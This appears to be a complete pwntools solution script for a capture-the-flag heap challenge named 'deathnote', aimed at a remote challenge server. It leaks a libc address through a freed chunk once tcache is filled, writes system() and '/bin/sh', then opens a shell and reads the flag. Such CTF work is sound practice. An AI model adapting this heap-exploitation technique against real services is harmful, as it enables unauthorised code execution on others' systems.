#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './deathnote'
elf = context.binary = ELF(exe, checksec=True)
libc = './glibc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '94.237.48.219', 38918

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'

def add(size, idx, data):
    io.sendlineafter(b'entry', b'1')
    io.sendlineafter(b'request?', str(size).encode())
    io.sendlineafter(b'Page?', str(idx).encode())
    io.sendlineafter(b'victim:', data)

def delete(idx):
    io.sendlineafter(b'entry', b'2')
    io.sendlineafter(b'?', str(idx).encode())

def show(idx):
    io.sendlineafter(b'entry', b'3')
    io.sendlineafter(b'?', str(idx).encode())

def execute():
    io.sendlineafter(b'entry', b'42')
    time.sleep(0.5)
    io.sendline(b'cat flag*')

def exploit():
    global io
    io = initialize()

    for idx in range(7):
        add(128, idx, b'A' * 0x8)
    add(128, 7, b'B' * 0x8)
    add(0x10, 8, b'C' * 8) # wilderness protection

    for idx in range(7):
        delete(idx)
    delete(7)

    show(7)
    io.recvuntil(b'content: ')
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x21ace0

    add(0x20, 0, str(hex(libc.sym['system'])))
    add(0x10, 1, b'/bin/sh\x00')
    execute()

    info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()